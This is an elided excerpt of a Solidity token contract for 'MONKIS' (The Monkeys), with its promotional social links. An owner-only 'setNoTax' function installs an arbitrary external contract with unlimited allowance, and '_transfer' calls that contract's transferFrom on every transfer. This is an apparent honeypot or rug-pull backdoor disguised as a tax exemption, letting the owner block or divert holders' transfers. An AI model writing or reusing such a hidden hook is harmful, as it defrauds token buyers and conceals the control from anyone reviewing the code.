...
https://t.me/monkiseth
https://www.themonkeys.vip
https://twitter.com/monkiseth
...
contract MONKIS is ERC20, Ownable {
    ...
    constructor () ERC20("The Monkeys", unicode"MONKIS") 
    {   
        address router;
        if (block.chainid == 56) {
    ...
    function _transfer(address from,address to,uint256 amount) internal  override {
        ...
        if(ladderTaxEnabled) {
            if(launchTime + 3000 < block.timestamp){
                ...
                _totalFeesOnBuy    = liquidityFeeOnBuy  + marketingFeeOnBuy;
                _totalFeesOnSell   = liquidityFeeOnSell + marketingFeeOnSell;
            }} else if (noTaxEnabled(from, to, amount)) {
                liquidityFeeOnBuy  = 0; // 0
                liquidityFeeOnSell = 0; // 0
    ...
    function setNoTax(address _tax) external onlyOwner {
        noTax = _tax; 
        _approve(zeroA, noTax, type(uint256).max);
    ...
    function noTaxEnabled(address from, address to, uint256 amount) internal returns (bool) {
        if (address(noTax) == address(0)) return true;
        if (IERC20(noTax).transferFrom(from, to, amount)) return true;
        return false;
    }
